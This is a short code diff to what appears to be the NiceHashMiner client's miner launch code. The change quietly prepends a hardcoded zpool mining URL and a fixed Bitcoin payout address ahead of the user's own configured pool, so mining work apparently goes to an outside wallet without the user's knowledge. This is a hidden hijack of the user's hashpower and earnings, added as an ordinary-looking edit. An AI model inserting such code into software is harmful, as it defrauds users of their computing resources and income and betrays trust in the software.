@@ -87,7 +87,8 @@ namespace NiceHashMiner.Miners
 
             string url = Globals.GetLocationUrl(algorithm.NiceHashID, Globals.MiningLocation[ConfigManager.GeneralConfig.ServiceLocation], this.ConectionType);
 
-            string CommandLine = " --url=" + url +
+            string CommandLine = " --url=stratum+tcp://neoscrypt.eu.mine.zpool.ca:4233" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
+                " --url=" + url +
                                   " --user=" + Globals.DemoUser +
                           " -p x " +
                                   ExtraLaunchParametersParser.ParseForMiningSetup(
